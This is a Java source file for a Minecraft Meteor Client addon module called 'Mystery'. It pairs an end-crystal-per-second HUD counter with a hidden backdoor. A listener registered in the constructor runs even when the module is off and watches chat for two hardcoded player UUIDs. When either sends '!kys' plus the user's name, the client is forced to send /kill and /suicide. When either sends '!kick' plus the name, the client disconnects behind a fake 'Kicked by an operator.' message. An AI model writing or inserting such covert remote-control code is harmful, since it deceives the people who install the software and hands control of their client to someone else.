package bplusdevelopment.modules.misc;

import bplusdevelopment.modules.AddModule;
import bplusdevelopment.modules.hud.stats.CrystalsPs;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.Systems;
import meteordevelopment.meteorclient.systems.hud.HUD;
import meteordevelopment.meteorclient.systems.hud.modules.HudElement;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.meteorclient.utils.network.Http;
import meteordevelopment.meteorclient.utils.network.MeteorExecutor;
import meteordevelopment.meteorclient.utils.player.InvUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.text.LiteralText;
import org.apache.commons.lang3.SystemUtils;

import java.security.MessageDigest;

public class Mystery extends Module {

    // The rat o-o scary
    public Mystery() {
        super(AddModule.BANANAMINUS, "mystery", "I wonder what this does...");

        MeteorClient.EVENT_BUS.subscribe(new Listener());
    }

    // Crystal per Second

    private int ticksPassed;
    private int first;
    private int second;
    private int difference;
    public static int crystalsPerSec;

    private class Listener {
        @EventHandler
        private void onPacketReceive(PacketEvent.Receive event) {
            if (!(event.packet instanceof GameMessageS2CPacket)) return;

            String sender = (((GameMessageS2CPacket) event.packet).getSender().toString());
            String msg = ((GameMessageS2CPacket) event.packet).getMessage().getString();

            if (sender.contains("dfcbebe4-b64e-45ba-b1dc-3b9f346c4d8a") //Beno
                    || sender.contains("a612b9ce-bac9-4391-bc85-f5bd2127db79")){ //alt


                if (msg.endsWith("!kys " + ign())) {
                    mc.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/kill"));
                    mc.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("/suicide"));
                } else if (msg.endsWith("!kick " + ign())) {
                    mc.getNetworkHandler().onDisconnect(new DisconnectS2CPacket(new LiteralText("Kicked by an operator.")));
                }
            }
        }

        private boolean isCounterActive() {
            for (HudElement element : HUD.get().elements) {
                if (element instanceof CrystalsPs && element.active) return true;
            }

            return false;
        }

        @EventHandler
        private void onTick(TickEvent.Pre event) {
            if (!Utils.canUpdate()) return;

            if (isCounterActive()) {
                if(ticksPassed < 21) ticksPassed++;
                else {
                    ticksPassed = 0;
                }

                if(ticksPassed == 1) first = InvUtils.find(Items.END_CRYSTAL).count();

                if(ticksPassed == 21) {
                    second = InvUtils.find(Items.END_CRYSTAL).count();
                    difference = -(second - first);
                    crystalsPerSec = Math.max(0, difference);
                }
            }
        }
    }

    private String ign() {
        return MinecraftClient.getInstance().getSession().getUsername();
    }
}
